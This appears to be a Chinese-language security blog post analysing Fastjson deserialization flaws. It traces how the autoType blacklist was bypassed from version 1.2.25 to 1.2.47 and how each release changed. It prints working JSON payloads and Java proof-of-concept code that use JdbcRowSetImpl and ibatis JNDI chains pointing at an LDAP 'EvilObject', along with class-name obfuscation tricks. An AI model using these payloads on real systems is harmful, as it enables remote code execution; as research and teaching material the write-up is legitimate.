<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109214959269.png" alt="image-20220109214959269"></p>
<p>黑名单如下：</p>
<pre><code class="java">bsh
com.mchange
com.sun.//这是templatesImpl和JdbcRowSetImpl所在的package
java.lang.Thread
java.net.Socket
java.rmi
javax.xml
org.apache.bcel
org.apache.commons.beanutils
org.apache.commons.collections.Transformer
org.apache.commons.collections.functors
org.apache.commons.collections4.comparators
org.apache.commons.fileupload
org.apache.myfaces.context.servlet
org.apache.tomcat
org.apache.wicket.util
org.codehaus.groovy.runtime
org.hibernat
org.jboss
org.mozilla.javascript
org.python.core
org.springframework
</code></pre>
<h3 id="1-2-25-1-2-41绕过"><a href="#1-2-25-1-2-41绕过" class="headerlink" title="1.2.25-1.2.41绕过"></a>1.2.25-1.2.41绕过</h3><p>因为黑名单中有<code>com.sun</code>，因此想要<strong>直接</strong>绕过黑名单基本是不可能了</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109231952820.png" alt="image-20220109231952820"></p>
<p>我们需要寻找其他方法来避开黑名单的检测。此后的绕过过程我们都以JdbcRowSetImpl链来分析。另外，因为1.2.25后添加了autoTypeSupport Check，因此我们需要先将<code>autoTypeSupport</code>设为<strong>true</strong></p>
<pre><code class="java">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String evilStr=&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:7777/#EvilObject\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;;
        JSON.parseObject(evilStr,Object.class);
</code></pre>
<p>在第三行下个断点进行分析：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109233459957.png" alt="image-20220109233459957"></p>
<p>我们发现最后一定会进入<code>checkAutoType()</code></p>
<p>如果既不在白名单，也不再黑名单中，则会执行以下代码：</p>
<pre><code class="java">                if (this.autoTypeSupport || expectClass != null) &#123;
                    clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader);
                &#125;
</code></pre>
<p>即call到TypeUtils#loadClass方法</p>
<p>但我们的所要进行反序列化的类都是在黑名单里面的，怎么办呢？</p>
<p>我们继续跟进loadClass看看。发现loadClass中有两个检测：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109233742373.png" alt="image-20220109233742373"></p>
<p><strong>如果是<code>[</code>开头的class name，就去掉<code>[</code>，并返回一个array类型的的新对象</strong></p>
<p><strong>如果是<code>L</code>开头、<code>;</code>结尾的class name，就去掉首尾，加载中间的class</strong></p>
<h4 id="方法一：以-开头"><a href="#方法一：以-开头" class="headerlink" title="方法一：以[开头"></a>方法一：以[开头</h4><p>那么我们试试以<code>[</code>开头</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109235030406.png" alt="image-20220109235030406"></p>
<p>按照提示在后面加个<code>[</code>，报了一个新的错误，需要再添加一个<code>&#123;</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109235105137.png" alt="image-20220109235105137"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109235132417.png" alt="image-20220109235132417"></p>
<pre><code class="java">    public static void main(String[] args) throws CannotCompileException, IOException, NotFoundException &#123;
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String evilStr=&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:7777/#EvilObject\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;;
        JSON.parseObject(evilStr,Object.class);
    &#125;
</code></pre>
<p>现在计算器就可以成功弹出了。</p>
<p>这个POC看起来实在奇怪，fastjson是如何区别数组类型的参数的，为何以<code>[</code>开头，后面就一定要跟<code>[&#123;</code>，我猜测是在正常流程中，fastjson做了一些处理，让字符串以<code>[</code>开头，表示后面的是一串数组json，因此会去寻找<code>[&#123;</code></p>
<h4 id="方法二：以L开头-结尾"><a href="#方法二：以L开头-结尾" class="headerlink" title="方法二：以L开头;结尾"></a>方法二：以L开头;结尾</h4><p>前面有分析到，以<code>L</code>开头，<code>;</code>结尾的class name会被截取中间的部分，然后传入loadClass。</p>
<pre><code class="java">....
&#125; else if (className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;)) &#123;
    String newClassName = className.substring(1, className.length() - 1);
    return loadClass(newClassName, classLoader);
....
</code></pre>
<p>那么我们可以构造以下的POC：</p>
<pre><code class="java">    public static void main(String[] args) throws CannotCompileException, IOException, NotFoundException &#123;
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        
        String evilStr=&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:7777/#EvilObject\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;;
        JSON.parseObject(evilStr,Object.class);
    &#125;
</code></pre>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220110124835115.png" alt="image-20220110124835115"></p>
<p>成功弹出计算器。</p>
<h3 id="1-2-42版本变化"><a href="#1-2-42版本变化" class="headerlink" title="1.2.42版本变化"></a>1.2.42版本变化</h3><p>在ParserConfig#checkAutoType()中，检测到<code>L</code>开头<code>;</code>结尾的classname，就会将首尾去掉，然后再放入黑名单中检查。</p>
<p>同时黑名单做了hash加密，但因为加密方式在<code>com.alibaba.fastjson.util.TypeUtils#fnv1a_64</code>中能找到，所以可以自己写脚本进行hash碰撞。</p>
<p>这里已经有人<a target="_blank" rel="noopener" href="https://github.com/LeadroyaL/fastjson-blacklist">整理出来了</a></p>
<h3 id="1-2-42绕过"><a href="#1-2-42绕过" class="headerlink" title="1.2.42绕过"></a>1.2.42绕过</h3><h4 id="方法一：以-开头-1"><a href="#方法一：以-开头-1" class="headerlink" title="方法一：以[开头"></a>方法一：以[开头</h4><p>新版本并未考虑到<code>[</code>开头的绕过方式，所以依旧可用：</p>
<pre><code class="java">    public static void main(String[] args) throws CannotCompileException, IOException, NotFoundException &#123;
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String evilStr=&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:7777/#EvilObject\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;;
        JSON.parseObject(evilStr,Object.class);
    &#125;
</code></pre>
<h4 id="方法二：以LL开头-结尾"><a href="#方法二：以LL开头-结尾" class="headerlink" title="方法二：以LL开头;;结尾"></a>方法二：以LL开头;;结尾</h4><p>绕过黑名单其实很简单，因为此处只对<code>L</code>和<code>;</code>做了一次检测，所以我们写两次就可以了。</p>
<p>POC如下：</p>
<pre><code class="java">    public static void main(String[] args) throws CannotCompileException, IOException, NotFoundException &#123;
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
      
        String evilStr=&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:7777/#EvilObject\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;;

        JSON.parseObject(evilStr,Object.class);
    &#125;
</code></pre>
<p>计算器成功弹出：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220110134359041.png" alt="image-20220110134359041"></p>
<h3 id="1-2-43版本变化及绕过"><a href="#1-2-43版本变化及绕过" class="headerlink" title="1.2.43版本变化及绕过"></a>1.2.43版本变化及绕过</h3><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220110134617419.png" alt="image-20220110134617419"></p>
<p>这里对复写LL;;的方式也做了检测，因此不能再使用这种方式绕过了。</p>
<p>但以<code>[</code>开头的方式依然可以绕过</p>
<p><strong>POC:</strong></p>
<pre><code class="java">    public static void main(String[] args) throws CannotCompileException, IOException, NotFoundException &#123;
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String evilStr=&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:7777/#EvilObject\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;;
        JSON.parseObject(evilStr,Object.class);
    &#125;
</code></pre>
<h3 id="1-2-44版本变化"><a href="#1-2-44版本变化" class="headerlink" title="1.2.44版本变化"></a>1.2.44版本变化</h3><p>在checkAutoType中对<code>[</code>开头的classname也做了检测，因此我们之前的方法失效。</p>
<p>这里找出了新的利用链，且并不在黑名单中：但必须要有需要有第三方组件<strong>ibatis-core 3:0</strong></p>
<pre><code class="java">    public static void main(String[] args) throws CannotCompileException, IOException, NotFoundException &#123;
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        
        String evilStr= &quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;ldap://localhost:7777/#EvilObject\&quot;&#125;&#125;&quot;;
        JSON.parseObject(evilStr,Object.class);
    &#125;
</code></pre>
<h3 id="1-2-25-1-2-47通杀"><a href="#1-2-25-1-2-47通杀" class="headerlink" title="1.2.25 - 1.2.47通杀"></a>1.2.25 - 1.2.47通杀</h3><p>这里不再调试了，大概就是不停的绕过。</p>
<p>fastjon中有一个判断，如果发现是Class类型，那么就会执行<code>com.alibaba.fastjson.util.TypeUtils#loadClass</code>，loadClass()中先通过java.lang.Class绕过了黑名单检测，并将该Class添加到了mapping中（会判断cache是否为true，默认为true），从而绕过了autoType中的检测。</p>
<blockquote>
<ul>
<li>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport不能利用</li>
<li>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用</li>
</ul>
</blockquote>
<pre><code class="java">&#123;
    &quot;a&quot;:&#123;
        &quot;@type&quot;:&quot;java.lang.Class&quot;,
        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;
    &#125;,
    &quot;b&quot;:&#123;
        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
        &quot;dataSourceName&quot;:&quot;ldap://localhost:1389/badNameClass&quot;,
        &quot;autoCommit&quot;:true
    &#125;
&#125;
</code></pre>
<h3 id="1-2-48版本变化"><a href="#1-2-48版本变化" class="headerlink" title="1.2.48版本变化"></a>1.2.48版本变化</h3><p>将默认cache设为了false，就无法将class放入mapping了。</p>
<h2 id="Fastjson不出网利用"><a href="#Fastjson不出网利用" class="headerlink" title="Fastjson不出网利用"></a>Fastjson不出网利用</h2><pre><code class="java">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl//feature需要设为允许给非public属性赋值
    
org.apache.tomcat.dbcp.dbcp2.BasicDataSource//需要dbcp或者tomcat-dbcp的依赖即可（dbcp是数据库连接池）
</code></pre>
<p>dbcp链暂时放在之后再分析。</p>
<h2 id="Reference-8"><a href="#Reference-8" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://www.yuque.com/tianxiadamutou/zcfd4v/xehnw7">Fastjson JdbcRowSetImpl 链及后续漏洞分析</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8979#toc-0">Fastjson 1.2.22-1.2.24反序列化漏洞分析</a></p>
<p><a target="_blank" rel="noopener" href="https://yyz9.cn/2021/08/07/fastjson%E5%90%84%E4%B8%AA%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">fastjson各个版本反序列化漏洞分析</a></p>

      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/2021/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E4%B8%8E%E5%88%86%E6%9E%90-3/" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>Prev</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
              2022-06-09 09:43:07
            </span>
            
                  <span class="post-categories">
                    <i class="iconfont icon-bookmark" title="Categories"></i>
                    
                    <span class="span--category">
                      <a href="/categories/Web-Security/" title="Web Security">
                        <b>#</b> Web Security
                      </a>
                    </span>
                    
                    <span class="span--category">
                      <a href="/categories/Web-Security/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="JAVA反序列化漏洞">
                        <b>#</b> JAVA反序列化漏洞
                      </a>
                    </span>
                    
                  </span>
              
                  <span class="post-tags">
                    <i class="iconfont icon-tags mr-10" title="Tags"></i>
                    
                    <span class="span--tag mr-8">
                      <a href="/tags/Web-Security/" title="Web Security">
                        #Web Security
                      </a>
                    </span>
                    
                    <span class="span--tag mr-8">
                      <a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Java反序列化">
                        #Java反序列化
                      </a>
                    </span>
                    
                  </span>
              
          </div>
          <div class="post-foot-prev">
            
              <a href="/2021/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86-5/" target="_self">
                <span>Next</span>
                <i class="iconfont icon-chevronright"></i>
              </a>
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">Contents</div>
    <div class="catalog-content">
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#URLDNS%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">URLDNS利用链</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Apache-Commons-Collections-%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">Apache Commons Collections 利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFCommons-Collections"><span class="toc-text">什么是Commons Collections</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Commons-Collections-1"><span class="toc-text">Commons Collections 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E5%87%86%E5%A4%87"><span class="toc-text">下载准备</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BC%E5%85%A5%E5%BA%93"><span class="toc-text">导入库</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%96%B9%E6%B3%95"><span class="toc-text">第一种方法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%96%B9%E6%B3%95"><span class="toc-text">第二种方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TransformedMap%E7%89%88%E6%9C%AC-POC%E6%9E%84%E9%80%A0%E8%BF%87%E7%A8%8B"><span class="toc-text">TransformedMap版本 - POC构造过程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Intro"><span class="toc-text">Intro</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9AInvokerTransformer"><span class="toc-text">第一步：InvokerTransformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9AChainedTransformer"><span class="toc-text">第二步：ChainedTransformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9AConstantTransformer"><span class="toc-text">第三步：ConstantTransformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9ATransformedMap-put"><span class="toc-text">第四步：TransformedMap - put()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9ATransformedMap-checkSetValue"><span class="toc-text">第五步：TransformedMap - checkSetValue()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E6%AD%A5%EF%BC%9A-AnnotationInvocationHandler"><span class="toc-text">第六步： AnnotationInvocationHandler</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E7%BB%88POC"><span class="toc-text">最终POC</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LazyMap%E7%89%88%E6%9C%AC-POC%E6%9E%84%E9%80%A0%E8%BF%87%E7%A8%8B-CommonsCollections-1"><span class="toc-text">LazyMap版本 - POC构造过程(CommonsCollections 1)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Intro-1"><span class="toc-text">Intro</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Payload%E6%9E%84%E9%80%A0"><span class="toc-text">Payload构造</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LazyMap%E7%89%88%E6%9C%AC-POC%E6%9E%84%E9%80%A0%E8%BF%87%E7%A8%8B%EF%BC%88CommonsCollections-5%EF%BC%89"><span class="toc-text">LazyMap版本 - POC构造过程（CommonsCollections 5）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Intro-2"><span class="toc-text">Intro</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%E5%88%B0%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A"><span class="toc-text">第一步到第三步：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9ALazyMap-get"><span class="toc-text">第四步：LazyMap - get()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9ATiedMapEntry-getValue"><span class="toc-text">第五步：TiedMapEntry.getValue()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E6%AD%A5%EF%BC%9ATiedMapEntry-toString"><span class="toc-text">第六步：TiedMapEntry.toString()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%83%E6%AD%A5%EF%BC%9ABadAttributeValueExpException"><span class="toc-text">第七步：BadAttributeValueExpException</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E7%BB%88POC-1"><span class="toc-text">最终POC</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference"><span class="toc-text">Reference</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Commons-Collections-2"><span class="toc-text">Commons Collections 2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-1"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E6%BC%94%E7%A4%BA"><span class="toc-text">复现演示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CommonsCollections-2-%E5%88%A9%E7%94%A8%E9%93%BE%E5%8E%9F%E7%90%86"><span class="toc-text">CommonsCollections 2 利用链原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Javassist%E7%94%9F%E6%88%90%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84Class"><span class="toc-text">Javassist生成执行命令的Class</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ClassLoader%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-text">ClassLoader加载字节码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TemplateImpl%E7%B1%BB%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">TemplateImpl类及其利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#defineTransletClasses"><span class="toc-text">defineTransletClasses</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#defineClass"><span class="toc-text">defineClass</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#getTransletInstance"><span class="toc-text">getTransletInstance()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#newTransformer"><span class="toc-text">newTransformer()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#getOutputProperties"><span class="toc-text">getOutputProperties()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">完整利用链</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CommonsCollections-2-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-text">CommonsCollections 2 利用链分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TransformingComparator"><span class="toc-text">TransformingComparator</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#InvokerTransformer"><span class="toc-text">InvokerTransformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PriorityQueue"><span class="toc-text">PriorityQueue</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#heapify"><span class="toc-text">heapify()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#shiftDown"><span class="toc-text">shiftDown</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload%E6%9E%84%E9%80%A0-1"><span class="toc-text">Payload构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%A0%E4%B8%AA%E9%97%AE%E9%A2%98"><span class="toc-text">几个问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference-1"><span class="toc-text">Reference</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Commons-Collections-3"><span class="toc-text">Commons Collections 3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-2"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E6%BC%94%E7%A4%BA-1"><span class="toc-text">复现演示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Commons-Collections-3-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-text">Commons Collections 3 利用链分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TemplatesImpl-amp-javassist"><span class="toc-text">TemplatesImpl &amp; javassist</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TrAXFilter"><span class="toc-text">TrAXFilter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9AInvokerTransformer"><span class="toc-text">方法一：InvokerTransformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9AInstantiateTransformer"><span class="toc-text">方法二：InstantiateTransformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ChainedTransformer"><span class="toc-text">ChainedTransformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ConstantTransformer"><span class="toc-text">ConstantTransformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LazyMap"><span class="toc-text">LazyMap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AnnotationInvocationHandler"><span class="toc-text">AnnotationInvocationHandler</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86-InvocationHandler-amp-AnnotationInvocationHandler"><span class="toc-text">动态代理 - InvocationHandler &amp; AnnotationInvocationHandler</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%82%B9"><span class="toc-text">反序列化点</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload%E6%9E%84%E9%80%A0-2"><span class="toc-text">Payload构造</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-InvokerTransformer"><span class="toc-text">方法一 InvokerTransformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-InstantiateTransformer"><span class="toc-text">方法二 InstantiateTransformer</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference-2"><span class="toc-text">Reference</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Commons-Collections-4"><span class="toc-text">Commons Collections 4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-3"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0"><span class="toc-text">利用链构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%9E%84%E9%80%A0"><span class="toc-text">payload构造</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-text">方法一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-text">方法二</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference-3"><span class="toc-text">Reference</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Commons-Collections-5"><span class="toc-text">Commons Collections 5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-4"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0-1"><span class="toc-text">利用链构造</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ChainedTransformer-amp-ConstantTransformer-amp-InvokerTransformer"><span class="toc-text">ChainedTransformer&amp;ConstantTransformer&amp;InvokerTransformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LazyMap-1"><span class="toc-text">LazyMap</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Commons-Collections-6"><span class="toc-text">Commons Collections 6</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-5"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0-2"><span class="toc-text">利用链构造</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-1"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TiedMapEntry-hashCode"><span class="toc-text">TiedMapEntry.hashCode()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HashMap-hash"><span class="toc-text">HashMap.hash()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E7%94%A8hash-%E5%A4%84%E4%B8%80%EF%BC%88%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%89%EF%BC%9A"><span class="toc-text">调用hash()处一（方法一）：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" 